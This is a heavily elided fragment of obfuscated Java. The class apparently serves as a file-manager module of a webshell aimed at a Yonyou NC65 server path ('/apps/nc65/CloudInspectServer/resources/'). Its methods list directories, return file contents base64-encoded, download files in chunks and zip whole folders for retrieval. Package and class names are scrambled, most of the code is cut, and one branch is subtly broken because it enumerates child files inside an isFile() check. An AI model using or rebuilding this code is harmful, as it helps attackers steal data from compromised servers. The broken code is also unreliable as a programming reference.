 ...
 */
package org.pxdfm.zvvpcp.wmzoxt;
...
public class Pxdrdqh {
    ...
    public Pxdrdqh() {
        ...
        mode = mode + "list";
        path = "";
        path = path + "/apps/nc65/CloudInspectServer/resources/";
    ...
    private String show() throws Exception {
        ...
        return Pxdrdqh.base64encode(fileContent);
    }
    ...
    private String downloadPart(String path, long blockIndex, long blockSize) throws Exception {
        ...
        return Pxdrdqh.base64encode(Arrays.copyOfRange(content, 0, size));
    }
    ...
    private static void zipFile(String srcDir, boolean KeepDirStructure) throws Exception {
        ...
        try {
            ...
            Pxdrdqh.compress(sourceFile, zos, sourceFile.getName(), KeepDirStructure);
        ...
        if (sourceFile.isFile()) {
            ...
            if (listFiles == null || listFiles.length == 0) {
                ...
                for (File file : listFiles) {
                    if (KeepDirStructure) {
                        Pxdrdqh.compress(file, zos, name + "/" + file.getName(), KeepDirStructure);
                        continue;
                    }
                    Pxdrdqh.compress(file, zos, file.getName(), KeepDirStructure);
                }
            }
        }
    }
